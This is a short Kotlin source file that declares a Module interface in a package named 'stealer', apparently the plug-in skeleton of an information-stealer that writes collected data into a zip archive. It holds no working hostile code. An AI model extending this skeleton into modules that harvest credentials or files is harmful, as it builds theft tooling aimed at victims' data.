package services.stealer

import java.util.zip.ZipOutputStream

interface Module {
    fun run(outputStream: ZipOutputStream)

}